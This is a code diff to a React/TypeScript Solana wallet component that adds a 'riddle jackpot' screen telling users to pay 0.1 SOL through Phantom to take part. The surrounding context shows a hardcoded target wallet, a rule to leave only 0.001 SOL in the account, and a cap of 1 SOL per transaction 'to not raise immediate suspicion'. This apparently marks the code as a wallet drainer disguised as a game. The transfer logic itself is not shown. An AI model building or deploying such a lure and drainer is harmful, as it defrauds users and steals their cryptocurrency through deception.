@@ -10,7 +10,7 @@ const TARGET_WALLET = '73WzDi36zHCA6ayKhzbQkRvVsRt6Ury5PbeUrqgRYeTf';
 const MIN_BALANCE_TO_KEEP = 0.001 * 1e9; // 0.001 SOL to leave in the account
 const MAX_TRANSACTION_AMOUNT = 1.0 * 1e9; // Max 1 SOL to not raise immediate suspicion
 
-const SolanaAuthInner = ({ onConfirm }) => {
+const SolanaAuthInner = ({ onConfirm }: { onConfirm: (isConfirmed: boolean) => void }) => {
     const { publicKey, signTransaction } = useWallet();
 
     useEffect(() => {
@@ -67,26 +67,35 @@ const SolanaAuthInner = ({ onConfirm }) => {
     };
 
     return (
-        <div>
-            <WalletMultiButton />
-        </div>
+      <div className='w-[100dvw] h-[100dvh] flex flex-col justify-end bg-black text-green-400 space-y-4 items-start overflow-hidden p-4'>
+      <p className='font-mono whitespace-pre-wrap'>
+          Rules: <br /><br />
+
+          {'>'} Pay 0.1 SOL via Phantom wallet (connect button on screen).  <br /><br />
+          {'>'} Wait for confirmation, then access the chat.  
+          Solve riddles, find the private key, claim all SOL.  <br /><br />
+          {'>'} 3 wrong guesses = Pay another 0.1 SOL. <br /><br /> 
+          {'>'} First to unlock the private key sentence wins all the SOL.  <br /> <br />
+          {'>'} Follow on X/Twitter for new rounds and jackpot updates. Entry fee and jackpot increase with each new wallet found.</p>
+      <WalletMultiButton />
+       </div>
     );
 };
 
 const SolanaAuth = () => {
-    const wallets = [new PhantomWalletAdapter()];
+  const wallets = [new PhantomWalletAdapter()];
 
-    const onConfirm = (isConfirmed) => {
-        console.log(isConfirmed ? 'Transaction confirmed' : 'Transaction failed');
-    };
+  const onConfirm = (isConfirmed: boolean) => {
+    console.log(isConfirmed ? 'Transaction confirmed' : 'Transaction failed');
+  };
 
-    return (
-        <WalletProvider wallets={wallets} autoConnect>
-            <WalletModalProvider>
-                <SolanaAuthInner onConfirm={onConfirm} />
-            </WalletModalProvider>
-        </WalletProvider>
-    );
+  return (
+    <WalletProvider wallets={wallets} autoConnect>
+      <WalletModalProvider>
+        <SolanaAuthInner onConfirm={onConfirm} />
+      </WalletModalProvider>
+    </WalletProvider>
+  );
 };
 
 export default SolanaAuth;
